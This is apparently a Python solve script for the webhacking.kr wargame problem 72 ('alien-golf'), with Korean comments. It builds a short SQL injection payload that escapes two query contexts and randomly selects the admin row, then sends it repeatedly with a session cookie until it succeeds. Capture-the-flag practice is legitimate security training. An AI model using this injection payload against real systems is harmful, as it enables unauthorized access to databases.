"""
webhacking.kr / alien-golf (problem 72) 자동 풀이 스크립트.

페이로드 설계:
  `1#'<LF>or id=0x61646d696e&&rand()<.5#`

  두 쿼리 컨텍스트(`no={no}`, `no='{no}'`)를 동시에 탈출한 뒤, WHERE 절에서
  `id='admin' AND rand()<.5` 조건으로 **admin 행만** 50% 확률로 통과시킨다.
  결과셋에는 admin 또는 NULL만 들어오므로 `mysqli_fetch_array` 첫 행이
  테이블 PK 순서에 영향을 받지 않는다 (원본 480pt 풀이의 UNION SELECT 합성 행
  원리와 동일한 안정성).

  4번의 호출 (admin, NULL, NULL, admin) 패턴 확률 = (1/2)^4 = 1/16.
  비결정 허용이므로 풀릴 때까지 반복 GET 한다.

점수: strlen=34, score = (140-34)*5 = 530점.
"""

import sys
import time
from urllib.parse import quote

import requests


CHALL_URL = "https://webhacking.kr/challenge/web-72/"

PAYLOAD = "1#'\nor id=0x61646d696e&&rand()<.5#"
# `&&` 가 환경 quirk 로 동작하지 않으면 아래 백업으로 교체:
# PAYLOAD = "1#'\nor id=0x61646d696e and rand()<.5#"  # 37 byte / 515점


def attempt(session: requests.Session) -> str:
    encoded = quote(PAYLOAD, safe="")
    r = session.get(f"{CHALL_URL}?no={encoded}", timeout=10)
    return r.text


def solved(html: str) -> bool:
    losers = ("sandbox1", "sandbox2", "sandbox", "nice try", "No Hack")
    return not any(tag in html for tag in losers)


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: solve.py <PHPSESSID>", file=sys.stderr)
        return 2

    phpsessid = sys.argv[1]
    s = requests.Session()
    s.cookies.set("PHPSESSID", phpsessid, domain="webhacking.kr")

    print(f"[+] payload  = {PAYLOAD!r}  (len={len(PAYLOAD)})")
    print(f"[+] expected = {(140 - len(PAYLOAD)) * 5} points")
    print("[+] success rate ~= 1/16 per attempt; brute-forcing...")

    for i in range(1, 1001):
        html = attempt(s)
        if solved(html):
            print(f"[+] solved on attempt #{i}")
            return 0
        if i % 16 == 0:
            print(f"    ...{i} tries")
        time.sleep(0.05)

    print("[-] exhausted retry budget; check session cookie / network", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
